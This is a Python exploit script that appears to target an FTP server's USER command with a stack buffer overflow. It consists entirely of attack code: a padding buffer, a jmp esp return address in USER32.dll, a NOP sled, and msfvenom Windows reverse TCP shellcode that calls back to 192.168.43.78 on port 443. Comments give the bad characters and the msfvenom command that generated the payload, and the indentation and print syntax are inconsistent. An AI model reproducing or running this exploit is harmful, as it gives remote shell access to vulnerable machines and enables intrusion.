#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# Bad Char \x00\x0a\x0d\x040
# jmp esp 7E429353 \x53\x93\x42\x7E USER32.dll
#msfvenom -p windows/shell_reverse_tcp lhost=192.168.43.78 lport=443 -b "\x00\x0a\x0d\x40" -f c
shell= ("\xbb\xc9\xad\x0e\x1c\xdb\xc8\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x58\x12\x83\xc0\x04\x03\x91\xa3\xec\xe9\xdd\x54\x72"
"\x11\x1d\xa5\x13\x9b\xf8\x94\x13\xff\x89\x87\xa3\x8b\xdf\x2b"
"\x4f\xd9\xcb\xb8\x3d\xf6\xfc\x09\x8b\x20\x33\x89\xa0\x11\x52"
"\x09\xbb\x45\xb4\x30\x74\x98\xb5\x75\x69\x51\xe7\x2e\xe5\xc4"
"\x17\x5a\xb3\xd4\x9c\x10\x55\x5d\x41\xe0\x54\x4c\xd4\x7a\x0f"
"\x4e\xd7\xaf\x3b\xc7\xcf\xac\x06\x91\x64\x06\xfc\x20\xac\x56"
"\xfd\x8f\x91\x56\x0c\xd1\xd6\x51\xef\xa4\x2e\xa2\x92\xbe\xf5"
"\xd8\x48\x4a\xed\x7b\x1a\xec\xc9\x7a\xcf\x6b\x9a\x71\xa4\xf8"
"\xc4\x95\x3b\x2c\x7f\xa1\xb0\xd3\xaf\x23\x82\xf7\x6b\x6f\x50"
"\x99\x2a\xd5\x37\xa6\x2c\xb6\xe8\x02\x27\x5b\xfc\x3e\x6a\x34"
"\x31\x73\x94\xc4\x5d\x04\xe7\xf6\xc2\xbe\x6f\xbb\x8b\x18\x68"
"\xbc\xa1\xdd\xe6\x43\x4a\x1e\x2f\x80\x1e\x4e\x47\x21\x1f\x05"
"\x97\xce\xca\x8a\xc7\x60\xa5\x6a\xb7\xc0\x15\x03\xdd\xce\x4a"
"\x33\xde\x04\xe3\xde\x25\xcf\xcc\xb7\x0e\x41\xa5\xc5\x50\x5c"
"\x8e\x43\xb6\x34\xe0\x05\x61\xa1\x99\x0f\xf9\x50\x65\x9a\x84"
"\x53\xed\x29\x79\x1d\x06\x47\x69\xca\xe6\x12\xd3\x5d\xf8\x88"
"\x7b\x01\x6b\x57\x7b\x4c\x90\xc0\x2c\x19\x66\x19\xb8\xb7\xd1"
"\xb3\xde\x45\x87\xfc\x5a\x92\x74\x02\x63\x57\xc0\x20\x73\xa1"
"\xc9\x6c\x27\x7d\x9c\x3a\x91\x3b\x76\x8d\x4b\x92\x25\x47\x1b"
"\x63\x06\x58\x5d\x6c\x43\x2e\x81\xdd\x3a\x77\xbe\xd2\xaa\x7f"
"\xc7\x0e\x4b\x7f\x12\x8b\x7b\xca\x3e\xba\x13\x93\xab\xfe\x79"
"\x24\x06\x3c\x84\xa7\xa2\xbd\x73\xb7\xc7\xb8\x38\x7f\x34\xb1"
"\x51\xea\x3a\x66\x51\x3f")
buffer = "A"*485 + "\x53\x93\x42\x7E" + "\x90" * 30+shell
try:
	s.connect(('192.168.43.184',21))
	data = s.recv(1024)
	print ("Sending Shell Code...")
	s.send('USER '+buffer+'\r\n')
	data = s.recv(1024)
	s.send(' PASS PASSWORD '+'\r\n')
    print "Shell Granted"
except:
    print"Failed Exploit"